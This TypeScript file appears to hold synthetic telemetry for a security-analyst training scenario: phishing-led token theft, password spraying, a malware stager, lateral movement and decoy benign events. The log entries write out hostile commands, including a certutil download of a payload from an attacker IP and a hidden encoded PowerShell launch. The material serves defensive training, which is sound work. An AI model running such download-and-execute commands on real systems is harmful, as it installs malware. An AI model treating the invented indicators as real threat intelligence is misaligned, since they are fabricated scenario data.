// ClickBox scenario dataset — synthetic telemetry and threat intel. Nothing
// here is real; all values are generated for training scenarios. Public
// (safe to import anywhere) — unlike scoring-data.ts, none of this is a
// scenario answer key.
import type {
  SecurityEvent,
  MitreTechnique,
  ResponseAction,
  ThreatIndicator,
} from "@/types/telemetry";

export const mitreTechniques: MitreTechnique[] = [
  { id: "T1566.002", name: "Spearphishing Link", tactic: "Initial Access" },
  { id: "T1528", name: "Steal Application Access Token", tactic: "Credential Access" },
  { id: "T1078", name: "Valid Accounts", tactic: "Defense Evasion" },
  { id: "T1110.003", name: "Password Spraying", tactic: "Credential Access" },
  { id: "T1059.001", name: "PowerShell", tactic: "Execution" },
  { id: "T1021.002", name: "SMB/Windows Admin Shares", tactic: "Lateral Movement" },
  { id: "T1114.002", name: "Remote Email Collection", tactic: "Collection" },
  { id: "T1537", name: "Transfer Data to Cloud Account", tactic: "Exfiltration" },
  { id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control" },
  { id: "T1091", name: "Replication Through Removable Media", tactic: "Lateral Movement" },
  { id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact" },
  { id: "T1098.002", name: "Additional Email Delegate Permissions", tactic: "Persistence" },
];

export const threatIndicators: ThreatIndicator[] = [
  {
    value: "adobe-secure-invoice.com",
    type: "domain",
    reputation: "malicious",
    actor: "Storm-1811",
    campaign: "ConsentHarvest",
    firstSeen: "2026-06-14",
    context:
      "Registered 4 days before first observed use. Hosts an OAuth consent lure impersonating an Adobe document-review flow. Redirects to login.microsoftonline.com with a rogue client_id.",
  },
  {
    value: "hxxps://adobe-secure-invoice.com/review/9f2a",
    type: "url",
    reputation: "malicious",
    actor: "Storm-1811",
    campaign: "ConsentHarvest",
    firstSeen: "2026-06-18",
    context:
      "Phishing landing page. Requests Mail.Read and offline_access consent for app 'Adobe Doc Review'.",
  },
  {
    value: "185.220.101.44",
    type: "ip",
    reputation: "suspicious",
    firstSeen: "2026-05-02",
    context:
      "Tor exit node. Frequently used for both benign privacy traffic and credential replay. Presence alone is not proof of compromise.",
  },
  {
    value: "41.203.18.77",
    type: "ip",
    reputation: "malicious",
    actor: "Storm-1811",
    firstSeen: "2026-06-20",
    context:
      "Lagos, NG hosting range. Observed replaying stolen refresh tokens within minutes of consent grant.",
  },
  {
    value: "a3f9cd127b4e8802aa19d5c6f0e77e14bc2291d4ff3a6b0c85de1147ab99c003",
    type: "sha256",
    reputation: "malicious",
    actor: "Storm-1811",
    campaign: "FIN-DESK loader",
    firstSeen: "2026-06-21",
    context:
      "Cobalt Strike stager delivered via certutil. Beacons to 41.203.18.77 over TLS on 443 with 60s jitter.",
  },
  {
    value: "e11ab3c9f7724d0e9c2b6a1f8d0c4e5b7a9385f6c0d1e2b3a4958677d8e9f001",
    type: "sha256",
    reputation: "known-good",
    firstSeen: "2024-01-11",
    context:
      "Microsoft-signed PowerShell 7.4 host binary. Signature valid. Common false-positive source.",
    decoy: true,
  },
  {
    value: "mkt-out.net",
    type: "domain",
    reputation: "known-good",
    firstSeen: "2023-09-30",
    context:
      "Marketing click-tracking domain used by the organisation's own campaign tooling. Benign.",
    decoy: true,
  },
  {
    value: "cdn-updates-msft.net",
    type: "domain",
    reputation: "unknown",
    firstSeen: "2026-06-25",
    context:
      "No prior observations. Name mimics a Microsoft CDN but is not a Microsoft-owned domain. Insufficient data.",
  },
];

/** Session telemetry — the investigable evidence surface (§2.8, §2.9, §6.12). */
export const securityEvents: SecurityEvent[] = [
  {
    id: "EV-1001",
    ts: "2026-06-20T08:41:00Z",
    source: "Email Gateway",
    action: "Message delivered",
    detail:
      "From billing@adobe-secure-invoice.com to sarah.chen@contoso.com — subject 'Document shared: Q3 vendor agreement'. SPF=fail DKIM=none DMARC=fail. Link to hxxps://adobe-secure-invoice.com/review/9f2a",
    entity: "sarah.chen@contoso.com",
    entityType: "mailbox",
    mitre: "T1566.002",
    severity: "high",
    correlationId: "CH-1",
  },
  {
    id: "EV-1002",
    ts: "2026-06-20T08:44:00Z",
    source: "Email Gateway",
    action: "Message delivered",
    detail:
      "Newsletter from news@mkt-out.net to sarah.chen@contoso.com. SPF=pass DKIM=pass DMARC=pass. Routine marketing traffic.",
    entity: "sarah.chen@contoso.com",
    entityType: "mailbox",
    severity: "info",
  },
  {
    id: "EV-1003",
    ts: "2026-06-20T09:02:00Z",
    source: "Proxy",
    action: "URL visited",
    detail:
      "sarah.chen@contoso.com opened hxxps://adobe-secure-invoice.com/review/9f2a from 82.14.6.190 (London, UK).",
    entity: "sarah.chen@contoso.com",
    entityType: "identity",
    mitre: "T1566.002",
    severity: "high",
    correlationId: "CH-1",
  },
  {
    id: "EV-1004",
    ts: "2026-06-20T09:04:00Z",
    source: "Entra ID",
    action: "OAuth consent granted",
    detail:
      "App 'Adobe Doc Review' (client_id 9f4c…21ab, unverified publisher) granted Mail.Read, Mail.Send, offline_access by sarah.chen@contoso.com.",
    entity: "sarah.chen@contoso.com",
    entityType: "identity",
    mitre: "T1528",
    severity: "critical",
    correlationId: "CH-1",
  },
  {
    id: "EV-1005",
    ts: "2026-06-20T09:07:00Z",
    source: "Entra ID",
    action: "Token replay",
    detail:
      "Refresh token for sarah.chen@contoso.com used from 41.203.18.77 (Lagos, NG). No interactive MFA prompt — token already satisfied claims.",
    entity: "sarah.chen@contoso.com",
    entityType: "identity",
    mitre: "T1078",
    severity: "critical",
    correlationId: "CH-1",
  },
  {
    id: "EV-1006",
    ts: "2026-06-20T09:12:00Z",
    source: "Exchange Online",
    action: "Inbox rule created",
    detail:
      "Rule 'RSS-Sync' created by app 'Adobe Doc Review': moves messages containing 'invoice', 'payment', 'wire' to RSS Feeds folder and marks read.",
    entity: "sarah.chen@contoso.com",
    entityType: "mailbox",
    mitre: "T1098.002",
    severity: "critical",
    correlationId: "CH-1",
  },
  {
    id: "EV-1007",
    ts: "2026-06-20T09:26:00Z",
    source: "Graph API",
    action: "Bulk mail read",
    detail:
      "1,284 messages enumerated via Mail.Read by app 'Adobe Doc Review' from 41.203.18.77 in 4 minutes.",
    entity: "sarah.chen@contoso.com",
    entityType: "cloud",
    mitre: "T1114.002",
    severity: "critical",
    correlationId: "CH-1",
  },
  {
    id: "EV-1008",
    ts: "2026-06-20T10:03:00Z",
    source: "Entra ID",
    action: "Failed sign-ins",
    detail:
      "312 failed sign-ins across 141 distinct accounts from 185.220.101.44 in 9 minutes. 2 succeeded (reports.svc, d.holt).",
    entity: "multiple",
    entityType: "identity",
    mitre: "T1110.003",
    severity: "high",
    correlationId: "PS-1",
  },
  {
    id: "EV-1009",
    ts: "2026-06-20T10:41:00Z",
    source: "Endpoint EDR",
    action: "Process created",
    detail:
      "certutil.exe -urlcache -split -f hxxp://41.203.18.77/u.txt C:\\Users\\d.holt\\AppData\\Local\\Temp\\svc.dll — parent winword.exe on FIN-DESK-22.",
    entity: "FIN-DESK-22",
    entityType: "device",
    mitre: "T1105",
    severity: "critical",
    correlationId: "PS-1",
  },
  {
    id: "EV-1010",
    ts: "2026-06-20T10:43:00Z",
    source: "Endpoint EDR",
    action: "Encoded command",
    detail:
      "powershell.exe -nop -w hidden -enc SQBFAFgA… loads svc.dll (sha256 a3f9cd12…c003) on FIN-DESK-22 as d.holt.",
    entity: "FIN-DESK-22",
    entityType: "device",
    mitre: "T1059.001",
    severity: "critical",
    correlationId: "PS-1",
  },
  {
    id: "EV-1011",
    ts: "2026-06-20T10:51:00Z",
    source: "Endpoint EDR",
    action: "Network connection",
    detail:
      "svc.dll → 41.203.18.77:443 TLS, 60s interval, 1.2KB beacons sustained over 42 minutes.",
    entity: "FIN-DESK-22",
    entityType: "device",
    mitre: "T1105",
    severity: "critical",
    correlationId: "PS-1",
  },
  {
    id: "EV-1012",
    ts: "2026-06-20T11:18:00Z",
    source: "Endpoint EDR",
    action: "SMB session",
    detail:
      "FIN-DESK-22 → SRV-DB-07 \\\\ADMIN$ authenticated as svc-backup. 3 files written to C:\\Windows\\Temp.",
    entity: "SRV-DB-07",
    entityType: "device",
    mitre: "T1021.002",
    severity: "critical",
    correlationId: "PS-1",
  },
  {
    id: "EV-1013",
    ts: "2026-06-20T11:34:00Z",
    source: "Endpoint EDR",
    action: "Scheduled task created",
    detail:
      "Task 'MsUpdateSync' registered on SRV-DB-07 running svc.dll every 30 minutes as SYSTEM.",
    entity: "SRV-DB-07",
    entityType: "device",
    mitre: "T1053",
    severity: "high",
    correlationId: "PS-1",
  },
  {
    id: "EV-1014",
    ts: "2026-06-20T11:52:00Z",
    source: "Cloud DLP",
    action: "Large download",
    detail:
      "3.4 GB downloaded from SharePoint site /sites/finance via Graph API using sarah.chen delegated token.",
    entity: "sarah.chen@contoso.com",
    entityType: "cloud",
    mitre: "T1537",
    severity: "critical",
    correlationId: "CH-1",
  },
  {
    id: "EV-1015",
    ts: "2026-06-20T09:33:00Z",
    source: "Endpoint EDR",
    action: "USB inserted",
    detail:
      "SanDisk Ultra 64GB mounted on LT-EXEC-JWALKER as E:. No file writes observed in following 6 hours.",
    entity: "LT-EXEC-JWALKER",
    entityType: "device",
    mitre: "T1091",
    severity: "low",
  },
  {
    id: "EV-1016",
    ts: "2026-06-20T10:12:00Z",
    source: "Entra ID",
    action: "Interactive sign-in",
    detail:
      "michael.johnson@contoso.com signed in from Toronto, CA. MFA satisfied. Compliant device.",
    entity: "michael.johnson@contoso.com",
    entityType: "identity",
    severity: "info",
  },
  {
    id: "EV-1017",
    ts: "2026-06-20T10:22:00Z",
    source: "Endpoint EDR",
    action: "Process created",
    detail:
      "pwsh.exe (sha256 e11ab3c9…f001, Microsoft-signed) ran an inventory script on ENG-MBP-047. Approved tooling.",
    entity: "ENG-MBP-047",
    entityType: "device",
    severity: "info",
  },
  {
    id: "EV-1018",
    ts: "2026-06-20T12:14:00Z",
    source: "Proxy",
    action: "URL visited",
    detail:
      "emily.davis@contoso.com opened hxxps://mkt-out.net/o/49x/ — campaign click tracker. Benign.",
    entity: "emily.davis@contoso.com",
    entityType: "identity",
    severity: "info",
  },
];

export const responseActions: ResponseAction[] = [
  { id: "isolate-device", label: "Isolate device", target: "device" },
  { id: "disable-account", label: "Disable account", target: "identity" },
  { id: "force-password-reset", label: "Force password reset", target: "identity" },
  { id: "revoke-tokens", label: "Revoke sessions & tokens", target: "identity" },
  { id: "block-sender", label: "Block sender / domain", target: "mailbox" },
  { id: "block-ip", label: "Block IP at egress", target: "device" },
];

export const dismissalReasons: string[] = [
  "Benign — expected administrative activity",
  "Benign — approved tooling / known-good hash",
  "Duplicate of an existing alert",
  "Tuning required — rule too broad",
  "Insufficient evidence to proceed",
];

export const eventById = (id: string) => securityEvents.find((e) => e.id === id);
